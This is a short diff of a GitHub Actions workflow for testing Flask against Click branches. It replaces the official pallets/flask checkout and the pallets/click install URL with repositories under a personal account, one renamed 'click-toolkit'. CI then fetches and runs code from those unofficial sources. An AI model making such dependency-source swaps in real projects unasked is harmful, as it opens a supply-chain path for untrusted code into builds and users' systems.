@@ -54,7 +54,7 @@ jobs:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
-          repository: pallets/flask
+          repository: IsmailofficialGithub/flask
       - uses: astral-sh/setup-uv@c771a70e6277c0a99b617c7a806ffedaca235ff9 # v9.0.0
         with:
           enable-cache: true
@@ -64,6 +64,6 @@ jobs:
       - run: uv sync --all-extras
       # --with overlays the Click branch on top of the version Flask's lock
       # pins, so a downstream regression shows up as a Flask test failure.
-      - run: uv run --with "git+https://github.com/pallets/click.git@${CLICK_REF}" -- pytest
+      - run: uv run --with "git+https://github.com/IsmailofficialGithub/click-toolkit.git@${CLICK_REF}" -- pytest
         env:
           CLICK_REF: ${{ matrix.branch }}
